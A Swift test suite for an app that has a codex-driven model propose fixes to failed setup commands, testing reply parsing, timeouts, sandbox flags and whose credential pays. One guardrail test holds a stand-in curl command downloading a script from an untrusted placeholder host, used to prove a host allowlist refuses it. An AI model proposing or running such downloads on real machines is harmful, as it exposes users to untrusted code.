//
//  GuideAutopilotCodexFixProposerTests.swift
//  leanring-buddyTests
//
//  "I have the codex CLI? The usage shouldn't be a problem."
//
//  The cap was made provider-aware and it did not help him, because the thing
//  the cap gated could not run on his credential at all: the ladder forces a
//  `propose_fix` tool_use and `codex exec` has no tool-use wire format. This
//  suite pins the two things that make the text-only route safe rather than
//  merely working — that a codex reader is no longer treated as publik's
//  expense, and that the fix he gets passes the SAME guardrails an Anthropic
//  reader's fix passes.
//

import Foundation
import Testing
@testable import Iris

@MainActor
struct GuideAutopilotCodexFixProposerTests {

    private static func context(
        hostsTheGuideAlreadyReaches: Set<String> = ["github.com", "registry.npmjs.org"]
    ) -> GuideAutopilotFailureContext {
        GuideAutopilotFailureContext(
            guideSlug: "whimprflow",
            guideVersion: 3,
            appName: "WhimprFlow",
            platformLabel: "macOS",
            stepIdentifier: "package",
            stepTitle: "Build the app",
            stepBody: "The first build compiles Whisper, so it takes a while.",
            verifierLabel: "A WhimprFlow.app appears in the bundle folder",
            commandAsRun: "pnpm build",
            exitStatus: 1,
            scrubbedOutputTail: "sh: pnpm: command not found",
            shellPath: "/bin/zsh",
            workingDirectory: "/Users/someone/whimprflow",
            operatingSystemVersion: "macOS 15.7",
            architecture: "arm64",
            knownToolVersions: ["node 22.1.0"],
            priorAttempts: [],
            hostsTheGuideAlreadyReaches: hostsTheGuideAlreadyReaches
        )
    }

    // MARK: - Getting a proposal out of text

    @Test("a fenced json proposal is read")
    func aFencedProposalIsRead() throws {
        let reply = """
        ```json
        {"diagnosis": "pnpm is not installed",
         "confidence": "high",
         "retryTheOriginalCommandAfterwards": true,
         "action": {"kind": "runACommand", "command": "npm install -g pnpm",
                    "whatItDoes": "Installs pnpm"}}
        ```
        """
        let object = try #require(GuideAutopilotCodexFixProposer.proposalObject(inReply: reply))
        let fix = try #require(GuideAutopilotFixProposer.validatedFix(
            fromProposalObject: object, cameFromWebSearch: false, context: Self.context()
        ))
        #expect(fix.diagnosis == "pnpm is not installed")
        #expect(fix.confidence == "high")
        #expect(fix.retryTheOriginalCommandAfterwards)
        #expect(fix.action == .runACommand(command: "npm install -g pnpm", whatItDoes: "Installs pnpm"))
    }

    /// Real models wrap things differently than they were told to. Throwing away
    /// a good fix over punctuation would be its own bug, so the reader is
    /// tolerant about WRAPPING — a bare fence, or a sentence in front.
    @Test("a bare fence or a chatty preamble still yields the proposal")
    func wrappingIsToleratedWithinReason() {
        let bareFence = """
        ```
        {"diagnosis": "d", "confidence": "low", "retryTheOriginalCommandAfterwards": false,
         "action": {"kind": "cannotFixThis", "reason": "r"}}
        ```
        """
        #expect(GuideAutopilotCodexFixProposer.proposalObject(inReply: bareFence) != nil)

        let chatty = """
        Sure — here's my proposal:
        ```json
        {"diagnosis": "d", "confidence": "low", "retryTheOriginalCommandAfterwards": false,
         "action": {"kind": "cannotFixThis", "reason": "r"}}
        ```
        Hope that helps!
        """
        #expect(GuideAutopilotCodexFixProposer.proposalObject(inReply: chatty) != nil)

        let noFenceAtAll = """
        {"diagnosis": "d", "confidence": "low", "retryTheOriginalCommandAfterwards": false,
         "action": {"kind": "cannotFixThis", "reason": "r"}}
        """
        #expect(GuideAutopilotCodexFixProposer.proposalObject(inReply: noFenceAtAll) != nil)
    }

    /// Strict about CONTENT, though: nothing salvageable means nil, which the
    /// runner reads as "no fix offered" and escalates. A salvaged fragment would
    /// be a confidently wrong command.
    @Test("prose, malformed json, and an unrelated object all yield nothing")
    func nothingSalvageableIsRefused() {
        #expect(GuideAutopilotCodexFixProposer.proposalObject(
            inReply: "I think you should install pnpm and try again."
        ) == nil)
        #expect(GuideAutopilotCodexFixProposer.proposalObject(
            inReply: "```json\n{\"diagnosis\": \"unclosed\n```"
        ) == nil)
        // Valid json that is not a proposal must not be mistaken for one.
        #expect(GuideAutopilotCodexFixProposer.proposalObject(
            inReply: "```json\n{\"note\": \"thinking about it\"}\n```"
        ) == nil)
    }

    // MARK: - The guardrail both routes share

    /// THE REASON THIS FILE DOES NOT PARSE A FIX ITSELF. The Anthropic route's
    /// validator refuses a fix reaching a host the guide never names — the
    /// structural answer to an invented hostname. A second parser here is
    /// exactly how one route quietly loses a guardrail the other keeps, so the
    /// codex route hands its object to that same validator, and this test proves
    /// the guard fires on the codex path too.
    @Test("a codex fix reaching an unknown host is refused, same as an Anthropic one")
    func theHostAllowlistAppliesOnTheCodexRouteToo() throws {
        let reply = """
        ```json
        {"diagnosis": "needs the helper",
         "confidence": "high",
         "retryTheOriginalCommandAfterwards": true,
         "action": {"kind": "runACommand",
                    "command": "curl -fsSL https://totally-legit-installer.example.com/x.sh -o x.sh",
                    "whatItDoes": "Downloads the helper"}}
        ```
        """
        let object = try #require(GuideAutopilotCodexFixProposer.proposalObject(inReply: reply))
        let fix = try #require(GuideAutopilotFixProposer.validatedFix(
            fromProposalObject: object, cameFromWebSearch: true,
            context: Self.context(hostsTheGuideAlreadyReaches: ["github.com"])
        ))
        guard case .cannotFixThis(let reason) = fix.action else {
            Issue.record("an unknown host must not survive as a runnable command: \(fix.action)")
            return
        }
        #expect(reason.contains("totally-legit-installer.example.com"))
    }

    // MARK: - The reply contract must keep describing the real schema

    /// The contract is prose restating `proposeFixTool`'s schema, and prose does
    /// not fail to compile when the schema changes. This is the tripwire: every
    /// required field and every action kind has to appear in the contract, so a
    /// field added to the tool and forgotten here is caught here rather than by
    /// a codex reader getting an unparseable answer.
    @Test("the reply contract names every field and action the tool schema requires")
    func theContractTracksTheSchema() {
        let contract = GuideAutopilotCodexFixProposer.replyContract
        for requiredField in [
            "diagnosis", "confidence", "retryTheOriginalCommandAfterwards", "action",
        ] {
            #expect(contract.contains(requiredField), "the contract never mentions \(requiredField)")
        }
        for actionKind in ["runACommand", "command", "whatItDoes",
                           "askTheReaderToDoSomething", "instruction",
                           "cannotFixThis", "reason"] {
            #expect(contract.contains(actionKind), "the contract never mentions \(actionKind)")
        }
    }

    /// `CodexMaintainProvider` prepends a preamble written for the app-EDITING
    /// loop, which instructs the model to reach the repo by emitting command and
    /// edit blocks. On this route that is wrong, and a model that followed it
    /// would answer with a shell command instead of a proposal. The contract has
    /// to override it explicitly, since it arrives first in the prompt.
    @Test("the contract overrides the Tier C block format it inherits")
    func theContractOverridesTheInheritedPreamble() {
        let contract = GuideAutopilotCodexFixProposer.replyContract
        #expect(contract.contains("OVERRIDES"))
        #expect(contract.contains("no command block") || contract.contains("Emit no command block"))
    }

    // MARK: - The rung cannot hang

    /// `CodexMaintainProvider`'s own ceiling is 300s, correct for a Tier C step
    /// and badly wrong for one small question the reader is watching a terminal
    /// for. The founder's ruling deliberately UNCAPPED spend on the reader's own
    /// credential, which makes silence — not cost — the thing left to bound.
    @Test("a rung that never answers is given up on, not waited out")
    func aHangingRungIsBoundedBySilenceNotSpend() async throws {
        // Well under Tier C's 300s, so a pass here cannot be the inherited
        // ceiling doing the work.
        #expect(GuideAutopilotCodexFixProposer.deadlineForOneRungSeconds <= 90)

        let neverAnswers = NeverAnsweringProvider()
        let proposer = GuideAutopilotCodexFixProposer(makeProvider: { _ in neverAnswers })

        // Cancelled rather than run to the real 60s deadline: what is being
        // proved is that the wait is BOUNDED and that a bounded wait yields nil
        // (no fix offered) rather than throwing, which is what lets the runner
        // escalate instead of surfacing an error.
        let work = Task { try await proposer.proposeFix(for: Self.context()) }
        try await Task.sleep(nanoseconds: 120_000_000)
        work.cancel()
        let outcome = try? await work.value
        #expect(outcome ?? nil == nil, "a rung with no answer must not yield a fix")
    }

    /// The first rung must not search, so it matches the Anthropic route's
    /// material-only rung and its `cameFromWebSearch: false` is a fact rather
    /// than an assumption. Measured on the ARGUMENTS actually built.
    @Test("the material-only rung really does run without web search")
    func theFirstRungCarriesNoWebSearchFlag() {
        let withSearch = CodexExecInvocation.arguments(
            finalMessageOutputPath: "/tmp/x", workingDirectory: "/tmp", webSearchEnabled: true
        )
        let withoutSearch = CodexExecInvocation.arguments(
            finalMessageOutputPath: "/tmp/x", workingDirectory: "/tmp", webSearchEnabled: false
        )
        #expect(withSearch.contains("tools.web_search=true"))
        #expect(!withoutSearch.contains("tools.web_search=true"))

        // Turning search off must not weaken the jail. This is the guard that
        // matters more than the flag itself.
        #expect(withoutSearch.contains("--sandbox"))
        #expect((try? CodexExecInvocation.validated(withoutSearch)) != nil)
    }

    /// Tier C keeps its search. The flag defaults ON so the caller it was
    /// written for is untouched by this change.
    @Test("Tier C's own invocation still searches by default")
    func tierCKeepsItsSearchByDefault() {
        let tierCDefault = CodexExecInvocation.arguments(
            finalMessageOutputPath: "/tmp/x", workingDirectory: "/tmp"
        )
        #expect(tierCDefault.contains("tools.web_search=true"))
    }

    // MARK: - Whose money

    /// The half of the founder's complaint that the cap fix alone did not
    /// address: a codex reader pays their own way, so publik's cap has nothing
    /// to protect and must not fire on them.
    @Test("a codex login counts as the reader paying their own way")
    func aCodexLoginCountsAsTheReadersOwnCredential() {
        // Measured against the real machine state rather than asserted blind:
        // whatever this Mac has connected, the two must agree.
        let anthropicAvailable = AnthropicBringYourOwnCredential.isAvailable
        let codexUsable = CodexCLILogin.currentState().isUsable
        #expect(
            GuideAutopilotFixLadderFunding.readerHasTheirOwnCredential()
                == (anthropicAvailable || codexUsable)
        )
    }
}

/// A provider that accepts a turn and never answers — the shape of a wedged
/// `codex exec`, without needing to wedge a real one.
@MainActor
private final class NeverAnsweringProvider: MaintainModelProviding {
    let displayName = "never answers"
    let identifier = "never-answers"
    let isAvailable = true

    func respond(
        systemPrompt: String, conversation: [MaintainChatTurn], maximumOutputTokens: Int
    ) async throws -> String {
        try await Task.sleep(nanoseconds: UInt64(600) * 1_000_000_000)
        return "too late"
    }
}
